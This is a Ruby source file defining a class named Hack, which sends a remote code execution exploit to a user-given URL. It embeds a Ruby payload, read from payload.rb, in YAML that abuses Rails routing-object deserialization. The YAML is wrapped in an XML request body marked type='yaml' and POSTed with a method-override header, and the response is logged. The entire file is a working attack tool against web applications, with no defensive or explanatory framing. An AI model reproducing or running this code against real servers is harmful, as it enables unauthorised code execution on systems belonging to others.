require 'net/http'
require 'uri'
class Hack

  attr_accessor :url, :payload

  def initialize(url)
    self.url = url
    self.payload = File.read("#{Rails.root}/payload.rb")
  end

  def url_valid?
    url.present? && url =~ URI::regexp
  end

  def drop_mah_payload!
    Timeout::timeout(5) {
      res  = exploit
      Rails.logger.info res.inspect
      Rails.logger.info res.body.inspect
      res.code.to_s == "200"
    }
  rescue Timeout::Error
    Rails.logger.info "TIMEOUT"
    false
  end


  def escape_payload(payload)
    "foo\n#{payload}\n__END__\n"
  end

  def wrap_payload(payload)
    "(#{payload}; @executed = true) unless @executed"
  end

  def exploit
    escaped_payload = escape_payload(wrap_payload(payload))
    encoded_payload = escaped_payload.to_yaml.sub('--- ','').chomp

yaml = %{
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? #{encoded_payload}
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format
}.strip

xml = %{
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">#{CGI.escape_html yaml}</exploit>
}.strip


    uri = URI.parse(url)
    http = Net::HTTP.new(uri.host, uri.port)

    request = Net::HTTP::Post.new(uri.request_uri)
    request.body = xml
    request["X-HTTP-METHOD-OVERRIDE"] = 'get'
    request["Content-Type"] = "text/xml"

    response = http.request(request)
  end

end


